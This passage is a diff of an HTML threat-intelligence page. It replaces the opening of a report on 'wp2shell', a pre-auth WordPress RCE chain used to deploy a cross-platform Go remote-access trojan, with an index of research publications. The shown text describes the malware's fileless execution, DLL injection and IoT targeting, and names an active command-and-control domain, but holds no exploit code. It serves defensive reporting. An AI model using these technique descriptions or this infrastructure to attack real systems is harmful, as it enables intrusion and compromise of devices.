@@ -1,1568 +1,393 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>wp2shell — Cross-Platform RAT Deployment via Zero-Credential WordPress Exploit (CVE-2026-63030 + CVE-2026-60137)</title>
-<style>
-:root {
-  --bg:#0a0c10;--bg2:#0f1117;--bg3:#161b22;--border:#21262d;
-  --red:#ff4444;--red-d:#b91c1c;--orange:#f97316;--yellow:#eab308;
-  --green:#22c55e;--blue:#3b82f6;--purple:#a855f7;
-  --text:#e6edf3;--dim:#8b949e;--mute:#484f58;
-}
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
-html{scroll-behavior:smooth;}
-body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',Arial,sans-serif;font-size:15px;line-height:1.75;-webkit-font-smoothing:antialiased;}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OFFENSIVE-INTEL // Threat Intelligence Research</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow+Condensed:wght@900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --void:      #040406;
+            --border-hi: #2A2A3A;
+            --green:     #00FF41;
+            --red:       #FF1A1A;
+            --cyan:      #00D4FF;
+            --white:     #EEEEF0;
+            --dim:       #55556A;
+            --muted:     #22222E;
+            --font-d: 'Barlow Condensed', sans-serif;
+            --font-m: 'Share Tech Mono', monospace;
+        }
 
-/* NAV */
-nav{position:sticky;top:0;z-index:300;background:rgba(10,12,16,0.96);border-bottom:1px solid var(--border);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);height:50px;display:flex;align-items:center;padding:0 24px;overflow-x:auto;overflow-y:hidden;}
-.nav-brand{font-family:'Courier New',Courier,monospace;font-size:12px;font-weight:700;color:var(--red);letter-spacing:.12em;text-decoration:none;white-space:nowrap;flex-shrink:0;margin-right:20px;}
-.nav-links{display:flex;align-items:center;gap:2px;flex:1;overflow-x:auto;scrollbar-width:none;}
-.nav-links::-webkit-scrollbar{display:none;}
-.nav-links a{display:inline-block;padding:4px 10px;font-size:11px;color:var(--dim);text-decoration:none;border-radius:4px;white-space:nowrap;transition:color .15s,background .15s;font-family:'Courier New',Courier,monospace;letter-spacing:.03em;}
-.nav-links a:hover,.nav-links a.active{color:var(--text);background:var(--bg3);}
-.nav-links a.active{color:var(--red);}
-.nav-right{flex-shrink:0;margin-left:16px;display:flex;align-items:center;}
-.tlp-badge{font-family:'Courier New',Courier,monospace;font-size:10px;font-weight:700;letter-spacing:.12em;padding:3px 10px;border-radius:3px;background:rgba(255,255,255,.08);color:#e6edf3;border:1px solid rgba(255,255,255,.25);white-space:nowrap;}
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
-/* HEADER */
-header{background:var(--bg2);border-bottom:1px solid var(--border);padding:64px 40px 56px;position:relative;overflow:hidden;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Crect width='40' height='40' fill='%230f1117'/%3E%3Crect x='4' y='4' width='32' height='32' fill='none' stroke='%2321262d' stroke-width='1.2' opacity='0.3'/%3E%3C/svg%3E");}
-header::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 60% 80% at 80% 50%,rgba(185,28,28,.15) 0%,transparent 65%),radial-gradient(ellipse 40% 60% at 10% 80%,rgba(59,130,246,.1) 0%,transparent 55%);pointer-events:none;}
-.header-inner{max-width:1120px;margin:0 auto;position:relative;}
-header h1{font-size:clamp(26px,4vw,46px);font-weight:800;line-height:1.1;letter-spacing:-.025em;margin-bottom:16px;color:var(--text);}
-header h1 .accent{color:var(--red);}
-.subtitle{font-size:15px;color:var(--dim);line-height:1.65;max-width:680px;margin-bottom:32px;}
-.meta-row{display:flex;flex-wrap:wrap;gap:24px;padding-top:24px;border-top:1px solid var(--border);}
-.meta-row span{font-family:'Courier New',Courier,monospace;font-size:11px;color:var(--mute);letter-spacing:.05em;}
-.meta-row span strong{color:var(--dim);font-weight:600;}
-.radar-wrap{position:absolute;right:0;top:0;bottom:0;width:520px;display:flex;align-items:center;justify-content:flex-end;pointer-events:none;overflow:hidden;}
-@media(max-width:860px){.radar-wrap{display:none;}}
+        body {
+            background: var(--void);
+            color: var(--white);
+            cursor: crosshair;
+            overflow-x: hidden;
+        }
 
-/* LAYOUT */
-.page-wrap{max-width:1120px;margin:0 auto;padding:0 24px;}
-.content-grid{display:grid;grid-template-columns:1fr 290px;gap:48px;padding:48px 0 80px;align-items:start;}
-@media(max-width:960px){.content-grid{grid-template-columns:1fr;}aside{display:none;}}
+        /* Scanlines */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.13) 2px, rgba(0,0,0,0.13) 4px);
+            pointer-events: none;
+            z-index: 9999;
+        }
 
-/* ARTICLE */
-article{min-width:0;}
-article h2{font-size:19px;font-weight:700;margin:60px 0 20px;padding-left:1rem;border-left:3px solid var(--red);color:var(--text);letter-spacing:-.01em;line-height:1.3;}
-article h2:first-child{margin-top:0;}
-article h3{font-size:14px;font-weight:600;margin:36px 0 14px;padding-left:.9rem;border-left:3px solid var(--orange);color:var(--text);letter-spacing:.01em;text-transform:uppercase;}
-article p{color:var(--dim);margin-bottom:16px;line-height:1.75;}
-article strong{color:var(--text);font-weight:600;}
-article ul,article ol{color:var(--dim);padding-left:22px;margin-bottom:16px;}
-article li{margin-bottom:6px;line-height:1.65;}
-article a{color:var(--blue);text-decoration:none;}
-article a:hover{text-decoration:underline;}
+        /* ─── HERO ─────────────────────────────────────────── */
+        .hero {
+            position: relative;
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 4rem 2.5rem 5rem;
+            overflow: hidden;
+        }
 
-/* CODE */
-pre{background:#0d1117;border:1px solid var(--border);border-radius:7px;padding:18px 20px;overflow-x:auto;margin:20px 0;font-size:12.5px;line-height:1.65;font-family:'Courier New',Courier,monospace;}
-code{font-family:'Courier New',Courier,monospace;font-size:12px;background:rgba(110,118,129,.1);border:1px solid var(--border);border-radius:4px;padding:2px 6px;color:#a5d6ff;word-break:break-all;}
-pre code{background:none;border:none;padding:0;font-size:inherit;color:var(--dim);word-break:normal;}
-span.kw{color:#ff7b72;}span.cm{color:var(--mute);font-style:italic;}
-span.st{color:#a8ff9c;}span.fn{color:#ffa657;}
-span.hl{background:rgba(185,28,28,.3);border-radius:2px;padding:1px 2px;}
-span.grn{color:var(--green);}span.blu{color:var(--blue);}
-span.yel{color:var(--yellow);}span.ppl{color:var(--purple);}
-span.red{color:var(--red);}span.org{color:var(--orange);}
-span.muted{color:var(--mute);}
+        #fx {
+            position: absolute;
+            inset: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
 
-/* CALLOUTS */
-.callout-red{border-left:3px solid var(--red);background:#1a0a0a;padding:14px 18px;margin:20px 0;border-radius:0 6px 6px 0;}
-.callout-red p{color:#fca5a5;margin-bottom:0;}
-.callout-red code{background:rgba(255,68,68,.1);border-color:rgba(255,68,68,.25);color:#fca5a5;}
-.callout-blue{border-left:3px solid var(--blue);background:#0a0f1a;padding:14px 18px;margin:20px 0;border-radius:0 6px 6px 0;}
-.callout-blue p{color:#93c5fd;margin-bottom:0;}
-.callout-blue code{background:rgba(59,130,246,.1);border-color:rgba(59,130,246,.25);color:#93c5fd;}
-.callout-orange{border-left:3px solid var(--orange);background:#1a100a;padding:14px 18px;margin:20px 0;border-radius:0 6px 6px 0;}
-.callout-orange p{color:#fdba74;margin-bottom:0;}
-.callout-purple{border-left:3px solid var(--purple);background:#100a1a;padding:14px 18px;margin:20px 0;border-radius:0 6px 6px 0;}
-.callout-purple p{color:#d8b4fe;margin-bottom:0;}
+        #hex-bg {
+            position: absolute;
+            inset: 0;
+            width: 100%; height: 100%;
+            opacity: 0.055;
+            pointer-events: none;
+            z-index: 1;
+        }
 
-/* TABLES */
-.tbl-wrap{overflow-x:auto;margin:20px 0;border-radius:8px;border:1px solid var(--border);}
-table{width:100%;border-collapse:collapse;font-size:13px;}
-th{background:var(--bg3);color:var(--mute);font-size:10px;letter-spacing:.1em;text-transform:uppercase;text-align:left;padding:10px 14px;border-bottom:1px solid var(--border);font-family:'Courier New',Courier,monospace;font-weight:600;}
-td{padding:10px 14px;border-bottom:1px solid var(--border);color:var(--dim);vertical-align:top;line-height:1.5;}
-tr:last-child td{border-bottom:none;}
-tr:hover td{background:rgba(255,255,255,.015);}
-td.mono{font-family:'Courier New',Courier,monospace;font-size:11px;}
-td.strong{color:var(--text);font-weight:500;}
-td.red-text{color:var(--red);font-family:'Courier New',Courier,monospace;font-size:11px;}
-td.green-text{color:var(--green);font-family:'Courier New',Courier,monospace;font-size:11px;}
+        .hero::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse 80% 70% at 50% 50%, transparent 40%, rgba(4,4,6,0.85) 100%);
+            pointer-events: none;
+        }
 
-/* PILLS */
-.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:10px;font-weight:700;letter-spacing:.04em;white-space:nowrap;font-family:'Courier New',Courier,monospace;}
-.p-red{background:rgba(255,68,68,.15);color:#fca5a5;border:1px solid rgba(255,68,68,.25);}
-.p-orange{background:rgba(249,115,22,.15);color:#fdba74;border:1px solid rgba(249,115,22,.25);}
-.p-blue{background:rgba(59,130,246,.12);color:#93c5fd;border:1px solid rgba(59,130,246,.2);}
-.p-green{background:rgba(34,197,94,.1);color:#86efac;border:1px solid rgba(34,197,94,.2);}
-.p-yellow{background:rgba(234,179,8,.1);color:#fde68a;border:1px solid rgba(234,179,8,.2);}
-.p-purple{background:rgba(168,85,247,.12);color:#d8b4fe;border:1px solid rgba(168,85,247,.25);}
-.p-dim{background:var(--bg3);color:var(--dim);border:1px solid var(--border);}
+        .hero-inner {
+            position: relative;
+            z-index: 2;
+            max-width: 1100px;
+        }
 
-/* FINDINGS PANEL */
-.findings-panel{margin:0 0 48px;border:1px solid rgba(255,68,68,.25);border-radius:10px;overflow:hidden;background:rgba(185,28,28,.04);}
-.findings-label{background:rgba(185,28,28,.12);border-bottom:1px solid rgba(255,68,68,.2);padding:10px 18px;font-family:'Courier New',Courier,monospace;font-size:10px;font-weight:700;letter-spacing:.14em;color:var(--red);display:flex;align-items:center;gap:10px;}
-.findings-label::before{content:'';display:inline-block;width:7px;height:7px;background:var(--red);border-radius:50%;animation:blink-dot 1.4s ease-in-out infinite;}
-@keyframes blink-dot{0%,100%{opacity:1;}50%{opacity:.2;}}
-.findings-grid{display:grid;grid-template-columns:repeat(3,1fr);}
-@media(max-width:760px){.findings-grid{grid-template-columns:1fr;}}
-@media(max-width:1060px) and (min-width:761px){.findings-grid{grid-template-columns:repeat(2,1fr);}}
-.finding-card{padding:16px 18px;border-right:1px solid rgba(255,68,68,.12);border-bottom:1px solid rgba(255,68,68,.12);}
-.finding-card:nth-child(3n){border-right:none;}
-.finding-card:nth-last-child(-n+3){border-bottom:none;}
-.fc-tag{font-family:'Courier New',Courier,monospace;font-size:9px;font-weight:700;letter-spacing:.1em;padding:2px 7px;border-radius:3px;display:inline-block;margin-bottom:8px;}
-.fc-tag-red{background:rgba(255,68,68,.15);color:#fca5a5;border:1px solid rgba(255,68,68,.3);}
-.fc-tag-orange{background:rgba(249,115,22,.12);color:#fdba74;border:1px solid rgba(249,115,22,.3);}
-.fc-tag-purple{background:rgba(168,85,247,.12);color:#d8b4fe;border:1px solid rgba(168,85,247,.3);}
-.fc-tag-blue{background:rgba(59,130,246,.12);color:#93c5fd;border:1px solid rgba(59,130,246,.3);}
-.fc-tag-yellow{background:rgba(234,179,8,.1);color:#fde68a;border:1px solid rgba(234,179,8,.3);}
-.fc-tag-green{background:rgba(34,197,94,.08);color:#86efac;border:1px solid rgba(34,197,94,.25);}
-.fc-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:5px;line-height:1.3;}
-.fc-body{font-size:12px;color:var(--dim);line-height:1.6;}
-.fc-body code{font-family:'Courier New',Courier,monospace;font-size:11px;background:rgba(255,255,255,.05);padding:1px 4px;border-radius:3px;color:var(--text);border:none;}
+        .eyebrow {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            letter-spacing: 0.32em;
+            color: var(--red);
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
+        }
 
-/* STAGE LIST */
-.stage-list{margin:20px 0;}
-.stage-item{display:flex;gap:14px;margin-bottom:14px;align-items:flex-start;}
-.stage-num{flex-shrink:0;width:28px;height:28px;background:rgba(185,28,28,.18);border:1px solid rgba(255,68,68,.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Courier New',Courier,monospace;font-size:10px;color:var(--red);font-weight:700;margin-top:2px;}
-.stage-name{font-size:14px;font-weight:600;color:var(--text);margin-bottom:3px;}
-.stage-desc{font-size:13px;color:var(--mute);line-height:1.55;}
+        .hero-title {
+            font-family: var(--font-d);
+            font-size: clamp(4.5rem, 11vw, 10rem);
+            font-weight: 900;
+            line-height: 0.88;
+            letter-spacing: -0.02em;
+            text-transform: uppercase;
+        }
 
-/* STAT CHIPS */
-.stat-chips{display:flex;flex-wrap:nowrap;gap:4px;margin:16px 0 24px;}
-.stat-chip{display:flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:5px 8px;font-family:'Courier New',Courier,monospace;font-size:11px;flex:1;min-width:0;}
-.stat-chip .sc-num{font-size:14px;font-weight:700;line-height:1;flex-shrink:0;}
-.stat-chip .sc-label{color:var(--mute);font-size:8px;white-space:nowrap;}
-.sc-red{color:var(--red);}.sc-orange{color:var(--orange);}.sc-purple{color:var(--purple);}
-.sc-blue{color:var(--blue);}.sc-green{color:var(--green);}.sc-yellow{color:var(--yellow);}
+        .t-solid  { color: var(--white); }
+        .t-outline {
+            color: transparent;
+            -webkit-text-stroke: 1.5px var(--red);
+        }
 
-/* TOOL TAGS */
-.tool-grid{display:flex;flex-wrap:wrap;gap:6px;margin:14px 0;}
-.tool{font-family:'Courier New',Courier,monospace;font-size:11px;padding:4px 10px;border-radius:5px;border:1px solid;}
-.t-danger{background:rgba(255,68,68,.09);border-color:rgba(255,68,68,.28);color:#fca5a5;}
-.t-warn{background:rgba(249,115,22,.08);border-color:rgba(249,115,22,.28);color:#fdba74;}
-.t-info{background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.28);color:#93c5fd;}
+        .glitch { position: relative; display: block; }
+        .glitch::before, .glitch::after {
+            content: attr(data-t);
+            position: absolute;
+            inset: 0;
+            font-family: inherit;
+            font-size: inherit;
+            font-weight: inherit;
+            line-height: inherit;
+            letter-spacing: inherit;
+            opacity: 0;
+        }
+        .glitch::before {
+            color: var(--cyan);
+            clip-path: polygon(0 28%, 100% 28%, 100% 48%, 0 48%);
+            animation: g1 5s infinite;
+        }
+        .glitch::after {
+            color: var(--red);
+            clip-path: polygon(0 62%, 100% 62%, 100% 80%, 0 80%);
+            animation: g2 5s infinite;
+        }
+        @keyframes g1 {
+            0%,88%,100%{ opacity:0; transform:translateX(0); }
+            89%{ opacity:1; transform:translateX(-5px); }
+            91%{ transform:translateX(5px); }
+            93%{ opacity:0; }
+        }
+        @keyframes g2 {
+            0%,88%,100%{ opacity:0; transform:translateX(0); }
+            90%{ opacity:1; transform:translateX(5px); }
+            92%{ transform:translateX(-5px); }
+            94%{ opacity:0; }
+        }
 
-/* SIDEBAR */
-aside{position:sticky;top:66px;}
-.sidebar-block{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:16px 18px;margin-bottom:14px;}
-.sidebar-block h4{font-family:'Courier New',Courier,monospace;font-size:9px;color:var(--mute);letter-spacing:.16em;text-transform:uppercase;margin-bottom:14px;font-weight:700;}
-.toc{list-style:none;padding:0;}
-.toc li{margin:0;}
-.toc a{display:block;padding:5px 8px;font-size:11px;color:var(--dim);text-decoration:none;border-left:2px solid transparent;border-radius:0 4px 4px 0;transition:all .15s;font-family:'Courier New',Courier,monospace;margin-bottom:1px;line-height:1.4;}
-.toc a:hover{color:var(--text);background:var(--bg3);border-left-color:var(--red);}
-.toc a.toc-active{color:var(--red);background:rgba(185,28,28,.08);border-left-color:var(--red);}
-.stat-table{width:100%;border-collapse:collapse;font-size:12px;}
-.stat-table td{padding:5px 0;border-bottom:1px solid var(--border);color:var(--dim);vertical-align:middle;}
-.stat-table tr:last-child td{border-bottom:none;}
-.stat-table td.val{text-align:right;font-family:'Courier New',Courier,monospace;color:var(--text);font-weight:600;font-size:11px;}
-.stat-table td.val.red{color:var(--red);}
-.stat-table td.val.green{color:var(--green);}
-.stat-table td.val.yellow{color:var(--yellow);}
-.ioc-list{list-style:none;padding:0;}
-.ioc{display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);font-family:'Courier New',Courier,monospace;font-size:11px;color:var(--dim);}
-.ioc:last-child{border-bottom:none;}
-.ioc-type{font-size:8px;padding:2px 5px;border-radius:3px;white-space:nowrap;font-weight:700;letter-spacing:.06em;background:rgba(255,68,68,.12);color:var(--red);border:1px solid rgba(255,68,68,.22);flex-shrink:0;}
-.ioc-type.blue{background:rgba(59,130,246,.12);color:#93c5fd;border-color:rgba(59,130,246,.22);}
-.ioc code{font-size:10px;background:none;border:none;padding:0;color:var(--dim);word-break:break-all;}
-.severity-score{font-family:'Courier New',Courier,monospace;font-size:26px;font-weight:700;color:var(--red);letter-spacing:-.02em;margin:8px 0;}
-.severity-note{font-size:11px;color:var(--mute);line-height:1.5;}
+        /* ─── RESEARCH CARDS ───────────────────────────────── */
+        .research-header {
+            margin-top: 3.5rem;
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            letter-spacing: 0.28em;
+            color: var(--dim);
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .research-header::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border-hi);
+        }
 
-/* FOOTER */
-footer{background:var(--bg2);border-top:1px solid var(--border);padding:44px 40px;}
-.footer-inner{max-width:1120px;margin:0 auto;display:grid;grid-template-columns:1fr auto;gap:40px;align-items:start;}
-.footer-body{font-size:12px;color:var(--mute);line-height:1.75;}
-.footer-meta{font-family:'Courier New',Courier,monospace;font-size:11px;color:var(--mute);text-align:right;white-space:nowrap;}
-.footer-meta div{margin-bottom:5px;}
+        .research-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1px;
+            background: var(--border-hi);
+            border: 1px solid var(--border-hi);
+        }
 
-/* MITRE GRID */
-.mitre-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin:16px 0;}
-.mitre-cell{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:10px 12px;}
-.mitre-id{font-family:'Courier New',Courier,monospace;font-size:11px;color:var(--blue);font-weight:700;}
-.mitre-name{font-size:12px;color:var(--text);line-height:1.3;margin:3px 0;}
-.mitre-conf{font-family:'Courier New',Courier,monospace;font-size:10px;color:var(--mute);}
+        .r-card {
+            background: var(--void);
+            padding: 1.6rem 1.75rem;
+            text-decoration: none;
+            color: inherit;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            border-left: 2px solid transparent;
+            transition: border-color 0.2s, background 0.2s;
+            position: relative;
+        }
+        .r-card:hover {
+            border-left-color: var(--red);
+            background: rgba(255, 26, 26, 0.04);
+        }
 
-@media(max-width:640px){footer{padding:32px 20px;}.footer-inner{grid-template-columns:1fr;}.footer-meta{text-align:left;}header{padding:40px 20px 36px;}.page-wrap{padding:0 16px;}}
+        .r-card-meta {
+            font-family: var(--font-m);
+            font-size: 0.58rem;
+            color: var(--dim);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+        }
+        .r-badge {
+            font-family: var(--font-m);
+            font-size: 0.55rem;
+            font-weight: 700;
+            letter-spacing: 0.18em;
+            padding: 2px 7px;
+            background: rgba(255,26,26,0.12);
+            color: var(--red);
+            border: 1px solid rgba(255,26,26,0.3);
+            text-transform: uppercase;
+        }
+        .r-badge.prev {
+            background: rgba(85,85,106,0.12);
+            color: var(--dim);
+            border-color: var(--border-hi);
+        }
 
-/* DIAGRAMS */
-.diagram-wrap{margin:28px 0;overflow-x:auto;}
-.diagram-wrap svg{display:block;max-width:100%;}
-.diag-label{font-family:'Courier New',Courier,monospace;font-size:10px;fill:var(--mute);letter-spacing:.08em;}
-.diag-title{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;font-size:11px;font-weight:600;fill:var(--text);}
-.diag-sub{font-family:'Courier New',Courier,monospace;font-size:9.5px;fill:var(--dim);}
+        .r-tags {
+            display: flex;
+            gap: 0.4rem;
+            flex-wrap: wrap;
+            margin-top: 0.1rem;
+        }
+        .r-tag {
+            font-family: var(--font-m);
+            font-size: 0.54rem;
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            color: var(--dim);
+            padding: 1px 6px;
+            border: 1px solid var(--border-hi);
+        }
 
-/* EVIDENCE IMAGES */
-.ev-section{margin:20px 0;}
-.ev-fig{margin:0;}
-.ev-fig img{width:100%;display:block;border:1px solid var(--border);border-radius:4px;background:#0d1117;}
-.ev-cap{font-family:'Courier New',Courier,monospace;font-size:10px;color:var(--mute);margin-top:5px;line-height:1.5;}
-.ev-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0;}
-</style>
+        .r-card-title {
+            font-family: var(--font-d);
+            font-size: clamp(1.3rem, 2.2vw, 1.75rem);
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 0.01em;
+            color: var(--white);
+            line-height: 1.05;
+            margin-top: 0.25rem;
+        }
+
+        .r-card-desc {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--dim);
+            line-height: 1.8;
+            margin-top: 0.1rem;
+        }
+
+        .r-card-link {
+            margin-top: auto;
+            padding-top: 1rem;
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--red);
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+        .r-card:hover .r-card-link { opacity: 1; }
+
+        @media (max-width: 720px) {
+            .research-grid { grid-template-columns: 1fr; }
+        }
+
+        ::selection { background: var(--red); color: #fff; }
+    </style>
 </head>
 <body>
 
+<section class="hero">
+    <canvas id="fx"></canvas>
+    <svg id="hex-bg" viewBox="0 0 1400 900" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice"></svg>
 
-<!-- HEADER -->
-<header>
-  <div class="radar-wrap">
-    <canvas id="camp-canvas" width="510" height="260" style="opacity:.42;flex-shrink:0;display:block;"></canvas>
-  </div>
-  <script>
-  (function(){
-    var cvs=document.getElementById('camp-canvas');
-    if(!cvs||!cvs.getContext)return;
-    var ctx=cvs.getContext('2d'),W=cvs.width,H=cvs.height,frame=0;
-    var N=[
-      {x:255,y:130,r:11,c:'#ff4444',lb:'opendir',fx:true},
-      {x:60,y:60,r:8,c:'#f97316',lb:'WordPress'},
-      {x:200,y:22,r:8,c:'#f97316',lb:'UniFi'},
-      {x:380,y:18,r:7,c:'#a855f7',lb:'Targets'},
-      {x:468,y:90,r:7,c:'#3b82f6',lb:'v9g6.my'},
-      {x:55,y:198,r:8,c:'#f97316',lb:'D-Link'},
-      {x:460,y:190,r:7,c:'#f97316',lb:'Totolink'},
-      {x:255,y:240,r:8,c:'#22c55e',lb:'Agent RAT'}
-    ];
-    N.forEach(function(n){n.ox=n.x;n.oy=n.y;});
-    var E=[[0,1],[0,2],[0,3],[0,4],[0,5],[0,6],[0,7],[1,7],[2,7],[5,7],[6,7],[3,4],[1,2]];
-    var P=E.map(function(e,i){return{ei:i,t:(i*.13)%1,sp:.004+i*.0002};});
-    function draw(){
-      ctx.clearRect(0,0,W,H);
-      var t=frame*.01;
-      N.forEach(function(n,i){if(!n.fx){n.x=n.ox+Math.sin(t+i*1.3)*4;n.y=n.oy+Math.cos(t*.8+i*.9)*3;}});
-      E.forEach(function(e,i){
-        var a=N[e[0]],b=N[e[1]],al=.1+.07*Math.sin(frame*.04+i);
-        ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
-        ctx.strokeStyle=a.c;ctx.globalAlpha=al*.25;ctx.lineWidth=4;ctx.stroke();
-        ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
-        ctx.strokeStyle=a.c;ctx.globalAlpha=al;ctx.lineWidth=.65;ctx.stroke();
-        ctx.globalAlpha=1;
-      });
-      P.forEach(function(p){
-        var e=E[p.ei],a=N[e[0]],b=N[e[1]];
-        ctx.beginPath();ctx.arc(a.x+(b.x-a.x)*p.t,a.y+(b.y-a.y)*p.t,2.5,0,Math.PI*2);
-        ctx.fillStyle=a.c;ctx.globalAlpha=.9;ctx.fill();ctx.globalAlpha=1;
-        p.t=(p.t+p.sp)%1;
-      });
-      N.forEach(function(n){
-        var g=ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,n.r*4);
-        g.addColorStop(0,n.c+'44');g.addColorStop(1,n.c+'00');
-        ctx.beginPath();ctx.arc(n.x,n.y,n.r*4,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();
-        ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);ctx.fillStyle=n.c+'18';ctx.fill();
-        ctx.strokeStyle=n.c;ctx.lineWidth=1.3;ctx.stroke();
-        if(n.fx){[18,30].forEach(function(off,k){ctx.beginPath();ctx.arc(n.x,n.y,n.r+off+4*Math.sin(frame*.07+k*1.57),0,Math.PI*2);ctx.strokeStyle=n.c;ctx.globalAlpha=.18-k*.06;ctx.lineWidth=.8;ctx.stroke();ctx.globalAlpha=1;});}
-        ctx.fillStyle=n.c;ctx.globalAlpha=.8;ctx.font=(n.fx?'bold 9px':'8px')+' monospace';ctx.textAlign='center';ctx.fillText(n.lb,n.x,n.y+n.r+11);ctx.globalAlpha=1;
-      });
-      frame++;requestAnimationFrame(draw);
-    }
-    draw();
-  })();
-  </script>
+    <div class="hero-inner">
+        <div class="eyebrow">Threat Intelligence Research</div>
+        <h1 class="hero-title">
+            <span class="t-solid glitch" data-t="OFFENSIVE">OFFENSIVE</span>
+            <span class="t-outline glitch" data-t="INTEL">INTEL</span>
+        </h1>
 
-  <div class="header-inner">
-    <h1><span class="accent">wp2shell</span> — Cross-Platform RAT Deployment via Zero-Credential WordPress Exploit</h1>
-    <p class="subtitle"><span style="color:var(--red);font-weight:700">CVE-2026-63030 + CVE-2026-60137</span> · Pre-auth WordPress Core RCE chain used as initial access to deploy Agent-TCP, a cross-platform Go RAT, across Windows &amp; Linux — combined with mass IoT compromise across 14 CPU architectures, fileless execution via MemfdCreate, and DLL injection on Windows</p>
-  </div>
-</header>
+        <div class="research-header">// Research Publications</div>
 
-<div class="page-wrap">
-<div class="content-grid">
+        <div class="research-grid">
 
-<!-- ARTICLE -->
-<article>
+            <a href="cross-platform-rat-deployment-via-wp2shell/" class="r-card">
+                <div class="r-card-meta">
+                    <span class="r-badge">// Latest</span>
+                    <span>2026-07-23</span>
+                </div>
+                <div class="r-tags">
+                    <span class="r-tag">Go RAT</span>
+                    <span class="r-tag">WordPress</span>
+                    <span class="r-tag">IoT Botnet</span>
+                    <span class="r-tag">CVE-2026-63030</span>
+                </div>
+                <div class="r-card-title">Cross-Platform RAT Deployment via wp2shell</div>
+                <div class="r-card-desc">Agent-TCP — Go RAT compiled for 14 CPU architectures, deployed via WordPress pre-auth SQLi and IoT mass compromise targeting Ubiquiti, D-Link, and Totolink devices across Taiwan, Japan, and the US. Active C2: v9g6.my.</div>
+                <div class="r-card-link">→ Read Report</div>
+            </a>
 
-<!-- 00 KEY FINDINGS -->
-<h2 id="findings">00. Key Findings</h2>
+            <a href="n4d-mesh-controller/" class="r-card">
+                <div class="r-card-meta">
+                    <span class="r-badge prev">// Previous</span>
+                    <span>2026-07-02</span>
+                </div>
+                <div class="r-tags">
+                    <span class="r-tag">Botnet</span>
+                    <span class="r-tag">IA</span>
+                    <span class="r-tag">LLM</span>
+                    <span class="r-tag">MCP</span>
+                </div>
+                <div class="r-card-title">N4D Mesh Controller</div>
+                <div class="r-card-desc">Precedent-setting botnet combining generic MCP exploitation, automated multi-step lateral movement planning, and AI/LLM infrastructure targeting with emerging defense-awareness capabilities.</div>
+                <div class="r-card-link">→ Read Report</div>
+            </a>
 
-<div class="findings-panel">
-  <div class="findings-label">KEY FINDINGS — BINARY ANALYSIS + LIVE CAMPAIGN (2026-07-22)</div>
-  <div class="findings-grid">
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-red">GO RAT — 14 ARCHITECTURES</span>
-      <div class="fc-title">Fileless + Post-Quantum Agent</div>
-      <div class="fc-body">
-        Unpacked binary analysis reveals <code>unix.MemfdCreate</code> for in-memory Linux execution (zero disk artifact). Windows variant uses <code>LoadLibraryEx</code> + <code>GetProcAddress</code> for DLL injection. TLS stack includes MLKEM (post-quantum) and ECH. Primary cipher: <strong>ChaCha20Poly1305 AEAD</strong>. Build path: <code>D:/BIN_Research/Knowledge/Defense-Evasion/go-agent-tcp</code>.
-      </div>
+        </div>
     </div>
-
-    <div class="finding-card">
-      <span class="fc-tag fc-tag-red">PRE-AUTH WORDPRESS RCE</span>
-      <div class="fc-title">6-Step Zero-Credential Chain</div>
